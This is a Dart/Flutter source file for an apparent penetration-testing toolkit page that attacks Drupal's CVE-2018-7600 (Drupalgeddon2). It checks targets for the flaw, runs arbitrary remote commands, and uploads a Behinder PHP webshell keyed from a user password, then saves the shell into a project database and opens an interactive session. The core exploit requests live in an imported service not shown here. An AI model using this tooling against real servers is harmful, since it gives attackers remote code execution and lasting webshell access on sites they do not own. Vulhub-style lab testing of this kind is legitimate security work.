import 'dart:convert';

import 'package:crypto/crypto.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart' show rootBundle;

import '../../app/constants.dart';
import '../../database/database_helper.dart';
import '../../exp/vulhub/misc_http_exp_service.dart';
import '../../models/project.dart';
import '../../models/webshell.dart';
import '../../theme/app_theme.dart';
import '../webshell_interactive_page.dart';
import '_vulhub_page_helpers.dart';
import 'base_vulhub_exp_page.dart';
import '../../app/localization.dart';

class DrupalExpPage extends BaseVulhubExpPage {
  final String? initialTargetUrl;

  const DrupalExpPage({super.key, this.initialTargetUrl});

  @override
  State<DrupalExpPage> createState() => _DrupalPageState();
}

class _DrupalPageState extends BaseVulhubExpPageState<DrupalExpPage> {
  @override
  IconData get pageIcon => Icons.water_drop;

  @override
  String get appBarTitle => S.vulhubDrupalTitle;

  @override
  String get cardTitle => S.vulhubDrupalCardTitle;

  @override
  String get cardSubtitle => S.vulhubDrupalCardSubtitle;

  late final TextEditingController _urlCtrl;
  final _cmdCtrl = TextEditingController(text: 'id');
  final _timeoutCtrl = TextEditingController();
  final _passwordCtrl = TextEditingController(
    text: AppConstants.defaultShellPassword,
  );

  DrupalExpService _svc() => DrupalExpService(
    baseUrl: _urlCtrl.text.trim(),
    timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
  );

  @override
  void initState() {
    super.initState();
    _urlCtrl = TextEditingController(text: widget.initialTargetUrl ?? '');
  }

  Future<void> _check() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    setState(() => running = true);
    appendLog('[*] 检测 CVE-2018-7600 (Drupalgeddon2)...');
    try {
      final r = await _svc().check();
      appendLog(
        r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : S.expLogNoVulnGeneric,
      );
    } catch (e) {
      appendLog(S.expLogException(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _getShell() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    setState(() => running = true);
    appendLog('[*] 尝试 GetShell...');
    try {
      final password = _passwordCtrl.text.trim().isEmpty
          ? AppConstants.defaultShellPassword
          : _passwordCtrl.text.trim();
      var shellContent = await rootBundle.loadString(
        'assets/defaults/payloads/webshell/php_behinder.php',
      );
      final key = md5
          .convert(utf8.encode(password))
          .toString()
          .substring(0, 16);
      shellContent = shellContent.replaceFirst(
        RegExp(r'\$key="[0-9a-f]{16}"'),
        '\$key="$key"',
      );
      final shellUrl = await _svc().getShell(shellContent, password: password);
      if (shellUrl != null) {
        appendLog('[+] GetShell 成功: $shellUrl');
        if (mounted) _openWebshellFromResult(shellUrl);
      } else {
        appendLog('[-] GetShell 失败');
      }
    } catch (e) {
      appendLog(S.expLogException(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _openWebshellFromResult(String shellUrl) async {
    String url = shellUrl;
    String password = AppConstants.defaultShellPassword;
    final passIdx = shellUrl.indexOf(' Pass:');
    if (passIdx > 0) {
      url = shellUrl.substring(0, passIdx).trim();
      password = shellUrl.substring(passIdx + 6).trim();
    }
    final now = DateTime.now();
    Webshell ws = Webshell(
      id: 0,
      projectId: 0,
      name: 'Drupal GetShell',
      url: url,
      password: password,
      type: 'php',
      method: 'POST',
      status: 1,
      connectorType: 'php_behinder',
      createdAt: now,
      updatedAt: now,
    );
    try {
      final db = DatabaseHelper();
      final project = await _showProjectPicker(db);
      if (project != null) {
        ws = await db.createWebshell(
          project.id,
          name: 'Drupal GetShell',
          url: url,
          password: password,
          method: 'POST',
          type: 'php',
          connectorType: 'php_behinder',
        );
      }
    } catch (_) {}
    if (!mounted) return;
    Navigator.of(context).push(
      MaterialPageRoute(builder: (_) => WebshellInteractivePage(webshell: ws)),
    );
  }

  Future<Project?> _showProjectPicker(DatabaseHelper db) async {
    final projects = await db.getAllProjects();
    if (!mounted) return null;
    if (projects.isEmpty) return _showCreateProjectDialog(db);
    return showDialog<Project>(
      context: context,
      builder: (ctx) => _ProjectPickerDialog(projects: projects),
    );
  }

  Future<Project?> _showCreateProjectDialog(DatabaseHelper db) async {
    final nameCtrl = TextEditingController();
    final domainCtrl = TextEditingController();
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text(
          '暂无项目',
          style: AppTextStyles.heading(color: AppColors.primary),
        ),
        content: SizedBox(
          width: 360,
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Text(
                '请先创建一个项目以保存 Webshell',
                style: AppTextStyles.caption(color: AppColors.textSecondary),
              ),
              const SizedBox(height: 16),
              TextField(
                controller: nameCtrl,
                autofocus: true,
                style: const TextStyle(color: AppColors.textPrimary),
                decoration: InputDecoration(
                  labelText: '项目名称',
                  hintText: '例如：目标站点',
                  hintStyle: AppTextStyles.caption(
                    size: 11,
                    color: AppColors.textMuted,
                  ),
                  labelStyle: const TextStyle(color: AppColors.textSecondary),
                  enabledBorder: OutlineInputBorder(
                    borderSide: BorderSide(
                      color: AppColors.primary.withValues(alpha: 0.5),
                    ),
                  ),
                  focusedBorder: const OutlineInputBorder(
                    borderSide: BorderSide(color: AppColors.primary),
                  ),
                ),
              ),
              const SizedBox(height: 12),
              TextField(
                controller: domainCtrl,
                style: const TextStyle(color: AppColors.textPrimary),
                decoration: InputDecoration(
                  labelText: '域名或ID',
                  hintText: '例如：example.com',
                  hintStyle: AppTextStyles.caption(
                    size: 11,
                    color: AppColors.textMuted,
                  ),
                  labelStyle: const TextStyle(color: AppColors.textSecondary),
                  enabledBorder: OutlineInputBorder(
                    borderSide: BorderSide(
                      color: AppColors.primary.withValues(alpha: 0.5),
                    ),
                  ),
                  focusedBorder: const OutlineInputBorder(
                    borderSide: BorderSide(color: AppColors.primary),
                  ),
                ),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, false),
            child: Text(
              '取消',
              style: AppTextStyles.body(color: AppColors.textSecondary),
            ),
          ),
          FilledButton(
            onPressed: () {
              if (nameCtrl.text.trim().isEmpty ||
                  domainCtrl.text.trim().isEmpty)
                return;
              Navigator.pop(ctx, true);
            },
            style: FilledButton.styleFrom(backgroundColor: AppColors.primary),
            child: Text(
              '创建',
              style: AppTextStyles.body(color: AppColors.bgDark),
            ),
          ),
        ],
      ),
    );
    if (ok == true &&
        nameCtrl.text.trim().isNotEmpty &&
        domainCtrl.text.trim().isNotEmpty) {
      return db.createProject(
        nameCtrl.text.trim(),
        domain: domainCtrl.text.trim(),
      );
    }
    return null;
  }

  Future<void> _exec() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    final cmd = _cmdCtrl.text.trim().isEmpty ? 'id' : _cmdCtrl.text.trim();
    setState(() => running = true);
    appendLog('[*] RCE 执行: $cmd');
    try {
      final out = await _svc().execRce(cmd);
      appendLog(
        out != null && out.isNotEmpty ? '[+] 输出:\n$out' : '[-] 无输出或执行失败',
      );
    } catch (e) {
      appendLog(S.expLogException(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  @override
  void dispose() {
    _urlCtrl.dispose();
    _cmdCtrl.dispose();
    _timeoutCtrl.dispose();
    _passwordCtrl.dispose();
    super.dispose();
  }

  @override
  Widget buildLeftPanel(BuildContext context) {
    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          vSecTitle(S.sectionTargetConfig),
          vTf(_urlCtrl, S.fieldTargetUrl, 'http://localhost:8080'),
          const SizedBox(height: 8),
          vTf(
            _timeoutCtrl,
            S.fieldTimeout,
            '${AppConstants.defaultHttpTimeoutSeconds}',
            type: TextInputType.number,
          ),
          const SizedBox(height: 8),
          vBtn(S.btnDetectVuln, running ? null : _check),
          const SizedBox(height: 16),
          vSecTitle(S.sectionCmdExec),
          vTf(_cmdCtrl, S.fieldCommand, 'id'),
          const SizedBox(height: 8),
          vBtn(S.btnExecCmd, running ? null : _exec),
          const SizedBox(height: 16),
          vSecTitle(S.sectionGetShell),
          vTf(_passwordCtrl, 'Shell 密码', AppConstants.defaultShellPassword),
          const SizedBox(height: 8),
          vBtn(S.btnGetShell, running ? null : _getShell),
        ],
      ),
    );
  }
}

class _ProjectPickerDialog extends StatelessWidget {
  final List<Project> projects;

  const _ProjectPickerDialog({required this.projects});

  @override
  Widget build(BuildContext context) {
    return AlertDialog(
      title: Text(
        S.titleSelectProject,
        style: AppTextStyles.heading(color: AppColors.primary),
      ),
      content: SizedBox(
        width: 360,
        child: ListView.builder(
          shrinkWrap: true,
          itemCount: projects.length,
          itemBuilder: (ctx, i) {
            final p = projects[i];
            return ListTile(
              leading: const Icon(
                Icons.folder_outlined,
                color: AppColors.primary,
                size: 20,
              ),
              title: Text(
                p.name,
                style: AppTextStyles.body(
                  size: 13,
                  color: AppColors.textPrimary,
                ),
              ),
              subtitle: Text(
                p.domain,
                style: AppTextStyles.caption(
                  size: 11,
                  color: AppColors.textMuted,
                ),
              ),
              onTap: () => Navigator.pop(context, p),
            );
          },
        ),
      ),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context),
          child: Text(
            '取消',
            style: AppTextStyles.body(color: AppColors.textSecondary),
          ),
        ),
      ],
    );
  }
}
